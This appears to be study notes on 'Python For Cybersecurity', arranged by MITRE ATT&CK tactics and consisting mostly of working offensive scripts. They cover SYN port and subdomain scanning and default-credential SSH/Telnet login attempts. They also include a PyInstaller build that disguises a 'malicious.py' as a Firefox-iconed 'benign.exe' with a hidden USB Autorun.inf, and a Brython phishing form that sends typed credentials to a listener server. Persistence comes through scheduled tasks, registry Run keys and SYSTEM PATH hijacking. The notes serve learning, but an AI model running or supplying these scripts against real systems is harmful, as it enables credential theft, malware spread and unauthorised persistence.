# Python For Cybersecurity

# 1. Introduction to Python for Cybersecurity

### Required Libraries for Python

```python
asyncssh
brython
dnspython
httpserver
libratom
paramiko
psutil
pycryptodomex
pyinstaller
requests
scapy
wmi
```

### Mitre Att&ck Framework

[Enterprise Matrix](https://attack.mitre.org/matrices/enterprise/)

## Python For Reconnaissance

1. Active Scanning - Network Scanning
2. Search Open Technical Databases - DNS Exploration

### 1. Active Scanning

### Scapy

[Introduction - Scapy 2.4.5. documentation](https://scapy.readthedocs.io/en/latest/introduction.html)

[http.cap](Python%20For%20Cybersecurity%20eb6905ebe9ef4a52a99d8d69de193b6a/http.cap)

```bash
# All the following commands are performed in the terminal
- from scapy.all import *
# http.cap file is a sample file present on the wireshark website
- packet = rdpcap('http.cap') 
- packet
# This will output the number TCP, UDP and ICMP packets present in the file
- p = packet[0]
- p.show()
# We selected the first packet and displayed it
# We can see different layers of the packet such as Ethernet, IP and TCP according to the predefined structure of the packet
# For the packet with data with get an extra entry as RAW
# common ports are mentioned using their names in the packet instead of using the port number
- p[TCP].dport = 8080
# using this we edited the dport field of TCP
- new_packet = IP()/TCP()
# this will create a packet with default field
# we can also mention the field during the creation of the packet
- new_packet = IP(dst="8.8.8.8")/TCP(dport=53)
- new_packet = IP(dst="8.8.8.8")/UDP(dport=53)/DNS()
```

### Port Scanning Using Scapy

```python
from scapy.all import *
# list of ports to be scanned by the program
ports = [25,80,53,443,445,8080,8443]
# Syn - Just to check whether the port is open or closed
def SynScan(host):
		# sr - function in scapy for sending packets and receiving answers
		# ans - saves the port which gives reponse
		# unans - saves the port with no reponse
		# To not waste time we set timeout to 2 sec
    ans,unans = sr(IP(dst=host)/TCP(dport=ports,flags="S"),timeout=2,verbose=0)
    print("Open ports at %s:" % host)
    for (s,r,) in ans:
				# we check whether the port with mentioned in the sending packet is the same port in the receiving packet
        if s[TCP].dport == r[TCP].sport:
            print(s[TCP].dport)

def DNSScan(host):
		# We created a DNS packet with the domain name
		# This checks for domain we mentioned
    ans,unans = sr(IP(dst=host)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="google.com")),timeout=2,verbose=0)
    if ans:
        print("DNS Server at %s"%host)
    
host = "8.8.8.8"

SynScan(host)
DNSScan(host)
```

### 2. Open Technical Databases

### DNSpython

[Dnspython Manual - dnspython 2.3.0 documentation](https://dnspython.readthedocs.io/en/latest/manual.html)

### Socket

[Socket Programming HOWTO - Python 3.10.5 documentation](https://docs.python.org/3/howto/sockets.html)

### DNS Exploration Using dns, dns.resolver and socket

[subdomains.txt](Python%20For%20Cybersecurity%20eb6905ebe9ef4a52a99d8d69de193b6a/subdomains.txt)

```python
import dns
import dns.resolver
import socket

def ReverseDNS(ip):
    try:
				# It fetches address by using the ip address passed to it
        result = socket.gethostbyaddr(ip)
        return [result[0]] + result[1]
    except socket.herror:
        return None

def DNSRequest(domain):
		# stores all the successful ips resolved
    ips = []
    try:
				# dns.resolver to check whether the subdomain exists
        result = dns.resolver.resolve(domain)
        if result:
            print(domain)
            for answer in result:
                print(answer)
								# To the get different domain name associated with it we forward the answer to reverse dns lookup
                print("Domain Names: %s" % ReverseDNS(answer.to_text()))
    except (dns.resolver.NXDOMAIN, dns.exception.Timeout):
        return []
    return ips

def SubdomainSearch(domain, dictionary, nums):
		# list for saving results
    successes = []
    for word in dictionary:
				# attaching word to domain name
        subdomain = word + "." + domain
				# pass the subdomain to check 
        DNSRequest(subdomain)
				# creates a word with following a number and attaches it to domain name
        if nums:
            for i in range(0, 10):
                s = word + str(i) + "." + domain
                DNSRequest(s)

domain = "google.com"
d = "subdomains.txt"
dictionary = []
# reading the subdomains file 
with open(d, "r") as f:
		# spliting to get all the subdomains seperately 
    dictionary = f.read().splitlines()
# passing domain and subdomains to check
SubdomainSearch(domain, dictionary, True)
```

## Python For Initial Access

1. Valid Accounts - Default Account Discovery
2. Replication Through Removable Media - Autorun Scripts

### 1. Valid Accounts

### paramiko

[Paramiko](https://docs.paramiko.org/en/stable/index.html)

### telnetlib

[telnetlib - Telnet client - Python 3.10.5 documentation](https://docs.python.org/3/library/telnetlib.html)

### Default Accounts Using paramiko, telnetlib

[defaults.txt](Python%20For%20Cybersecurity%20eb6905ebe9ef4a52a99d8d69de193b6a/defaults.txt)

```python
import paramiko
import telnetlib

# we also have to keep in mind that maybe the ssh is not running on the common port
def SSHLogin(host,port,username,password):
    try:
				# using paramiko ssh client to establish a connection 
        ssh = paramiko.SSHClient()
				# as we are scanning the host we dont have the keys so we are already defining as missing using paramiko policy
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				# establishing a connection 
        ssh.connect(host,port=port,username=username,password=password);
        # trying to open a session
				ssh_session = ssh.get_transport().open_session()
				# checking for a active session to check if the credentials were correct or not
        if ssh_session.active:
            print("Login successful on %s:%s with username %s and password %s" % (host,port,username,password))
    except:
            print("Login failed %s %s" % (username,password))
    ssh.close()
 
def TelnetLogin(host,port,username,password):
		# we defined the user n password as bytes
		user = bytes(username + "\n","utf-8")
		passwd = bytes(password + "\n","utf-8")
    h = "http://"+host+":"+port+"/"
    # telnetlib sets up the telnet connection
		tn = telnetlib.Telnet(h)
		# .read_until works only if the prompt name is not changed
		# The .read_until keeps on reading the data till it find the element it is searching for in the stream of data.
    tn.read_until(bytes("login: ","utf-8"))
		# The .write write data into the prompt we got using the .read_until
    tn.write(user)
    tn.read_until(bytes("password: ","utf-8"))
    tn.write(passwd)
    try: 
				# expect performs read_until for a list of elements
				# if we get the last login then we can confirm that we have successfully logged in the telnet server
        result = tn.expect([bytes("Last login: ","utf-8")], timeout = 2)
        if (result[0] > 0):
            print("Telnet login successful on %s:%s with username %s and password %s" % (host,port,username,password))
        tn.close()
    except EOFError:
        print("Login failed %s %s" % (username,password))

host = "127.0.0.1"
port = 2200
with open("defaults.txt","r") as f:
    for line in f:
				# splitting as the username and password are mentioned in the single line.
        vals = line.split()
				# index 0 is username and index 1 is password
        username = vals[0].strip()
        password = vals[1].strip()
				
				
        SSHLogin(host,port,username,password)
        TelnetLogin(host,port,username,password)
```

### 2. Replication Through Removable Media

### shutil

[shutil - High-level file operations - Python 3.10.5 documentation](https://docs.python.org/3/library/shutil.html)

### Autorun Scripts Using shutil, pyinstaller

[Firefox.ico](Python%20For%20Cybersecurity%20eb6905ebe9ef4a52a99d8d69de193b6a/Firefox.ico)

```python
print("I am a malicious program.")
```

```python
import PyInstaller.__main__
import shutil
import os

filename = "malicious.py"
exename = "benign.exe"
icon = "Firefox.ico"
pwd = os.getcwd()
usbdir = os.path.join(pwd,"USB")

if os.path.isfile(exename):
    os.remove(exename)

# Create executable from Python script
PyInstaller.__main__.run([
    "malicious.py",
    "--onefile",
    "--clean",
    "--log-level=ERROR",
    "--name="+exename,
    "--icon="+icon
])

# Clean up after Pyinstaller
shutil.move(os.path.join(pwd,"dist",exename),pwd)
shutil.rmtree("dist")
shutil.rmtree("build")
shutil.rmtree("__pycache__")
os.remove(exename+".spec")

# Create Autorun File
with open("Autorun.inf","w") as o:
    o.write("(Autorun)\n")
    o.write("Open="+exename+"\n")
    o.write("Action=Start Firefox Portable\n")
    o.write("Label=My USB\n")
    o.write("Icon="+exename+"\n")

# Move files to USB and set to hidden
shutil.move(exename,usbdir)
shutil.move("Autorun.inf",usbdir)
os.system("attrib +h "+os.path.join(usbdir,"Autorun.inf"))
```

# 2. Execution, persistence, privilege escalation and evasion

## Python For Execution

1. User Execution - Malicious Links
2. Scheduled Task/Job - Scheduled Execution

### 1. User Execution

### http

[](https://docs.python.org/3/library/http.html)

### urllib

[urllib - URL handling modules - Python 3.10.5 documentation](https://docs.python.org/3/library/urllib.html)

### brython

[Brython documentation](https://www.brython.info/static_doc/en/intro.html)

### Malicious Links using http.server, urllib.parse and brython

[example.html](Python%20For%20Cybersecurity%20eb6905ebe9ef4a52a99d8d69de193b6a/example.html)

brython.js

brython_stdlib.js

> We can create a proper html page to maliciously takeout the user credentials out. Brython helps inserting a python interpreter into a webpage very easily.
> 

```jsx
<script type="text/python3">
from browser import document,ajax
host="127.0.0.1"
port="8443"
def submitCreds(ev):
	username=document['email'].value
	password=document['pass'].value
	url = "http://"+host+":"+port+"?user="+username+"&password="+password
	req = ajax.ajax()
	req.open("GET",url,True)
	#req.bind("complete",complete)
	req.send()
document["submit"].bind("click",submitCreds)
</script>
```

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse,parse_qs

hostName = "localhost"
serverPort = 8443

class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
				# parse_qs parses a query string given as a string argument
        queries = parse_qs(urlparse(self.path).query)
				# checking 
        print("Username: %s, Password: %s"%(queries["user"][0],queries["password"][0]))
				# The HTTP 300 Multiple Choices redirect status response code indicates that the request has more than one possible responses
        self.send_response(300)
				# forwarding to google.com
        self.send_header("Location", "http://www.google.com")
        self.end_headers()

if __name__ == "__main__":        
		# for starting the server 
    webServer = HTTPServer((hostName, serverPort), MyServer)
    print("Server started http://%s:%s" % (hostName, serverPort))

    try:
        webServer.serve_forever()
    except KeyboardInterrupt:
        pass

    webServer.server_close()
    print("Server stopped.")
```

### 2. Scheduled Task/Jobs

### random

[random - Generate pseudo-random numbers - Python 3.10.5 documentation](https://docs.python.org/3/library/random.html)

### datetime

[datetime - Basic date and time types - Python 3.10.5 documentation](https://docs.python.org/3/library/datetime.html)

### schtasks

[Schtasks - Scheduled tasks - Windows CMD - SS64.com](https://ss64.com/nt/schtasks.html)

```python
# os - for path n all
# datetime - to set the time 
import os, random
from datetime import datetime,timedelta
# to check whether the task we want to create already exists on the system
if os.system("schtasks /query /tn SecurityScan") == 0:
    os.system("schtasks /delete /f /tn SecurityScan")
# here we are just printing out but we can use this to run scripts,exfiltrate data and many more....
print("I am doing malicious things")
# created a persistence for our execution file
filedir = os.path.join(os.getcwd(),"sched.py")

# time interval - 1 minute
maxInterval = 1
# random library for task running, random makes us less visible
interval = 1+(random.random()*(maxInterval-1))
# for more precise time interval we can take help of schtask documentation
dt = datetime.now() + timedelta(minutes=interval)
# string operation to create desired time to execute
t = "%s:%s" % (str(dt.hour).zfill(2),str(dt.minute).zfill(2))
d = "%s/%s/%s" % (dt.month,str(dt.day).zfill(2),dt.year)
# running the task using os library
os.system('schtasks /create /tn SecurityScan /tr "'+filedir+'" /sc once /st '+t+' /sd '+d)
# sc once - run once
# st - time to run it
# sd - date to run it
# tn - task name
# tr - task run - provide directory
input()
```

## Python For Persistence

1. Boot or Logon Autostart Execution - Registry Autorun
2. Hijack Execution Flow - Modified Path

### Boot or Logon Autostart Execution

[winreg - Windows registry access - Python 3.10.5 documentation](https://docs.python.org/3/library/winreg.html)

## Registry Autorun Using os, shutil, winreg

```python
import os, shutil, winreg

filedir = os.path.join(os.getcwd(),"Temp")
filename = "benign.exe"
filepath = os.path.join(filedir,filename)
# cleanup
if os.path.isfile(filepath):
    os.remove(filepath)

# Use BuildExe to create malicious executable
os.system("python BuildExe.py")

# Move malicious executable to desired directory
shutil.move(filename,filedir)

# Windows default autorun keys:
# HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
# HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
# HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
# HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce

regkey = 1

if regkey < 2:
    reghive = winreg.HKEY_CURRENT_USER
else:
    reghive = winreg.HKEY_LOCAL_MACHINE
if (regkey % 2) == 0:
    regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
else:
    regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"

# Add registry autorun key
reg = winreg.ConnectRegistry(None,reghive)
key = winreg.OpenKey(reg,regpath,0,access=winreg.KEY_WRITE)
winreg.SetValueEx(key,"SecurityScan",0,winreg.REG_SZ,filepath)
```

```python
# Build executable file from python file

import PyInstaller.__main__
import shutil
import os

filename = "malicious.py"
exename = "benign.exe"
icon = "Firefox.ico"
pwd = os.getcwd()
usbdir = os.path.join(pwd,"USB")

if os.path.isfile(exename):
    os.remove(exename)

# Create executable from Python script
PyInstaller.__main__.run([
    "malicious.py",
    "--onefile",
    "--clean",
    "--log-level=ERROR",
    "--name="+exename,
    "--icon="+icon
])

# Clean up after Pyinstaller
shutil.move(os.path.join(pwd,"dist",exename),pwd)
shutil.rmtree("dist")
shutil.rmtree("build")
shutil.rmtree("__pycache__")
os.remove(exename+".spec")
```

### Hijack Execution Flow

### Modifying the path using os and winreg

```python
import os, winreg

def readPathValue(reghive,regpath):
    reg = winreg.ConnectRegistry(None,reghive)
    key = winreg.OpenKey(reg,regpath,access=winreg.KEY_READ)
    index = 0
    while True:
        val = winreg.EnumValue(key,index)
        if val[0] == "Path":
            return val[1]
        index += 1

def editPathValue(reghive,regpath,targetdir):
    path = readPathValue(reghive,regpath)
    newpath = targetdir + ";" + path
    reg = winreg.ConnectRegistry(None,reghive)
    key = winreg.OpenKey(reg,regpath,access=winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key,"Path",0,winreg.REG_EXPAND_SZ,newpath)
    
# Modify user path
#reghive = winreg.HKEY_CURRENT_USER
#regpath = "Environment"
targetdir = os.getcwd()

#editPathValue(reghive,regpath,targetdir)

# Modify SYSTEM path
reghive = winreg.HKEY_LOCAL_MACHINE
regpath = "SYSTEM\CurrentControlSet\Control\Session Manager\Environment"
editPathValue(reghive,regpath,targetdir)
```

## Python For Privilege Escalation

## Python For Defense Evasion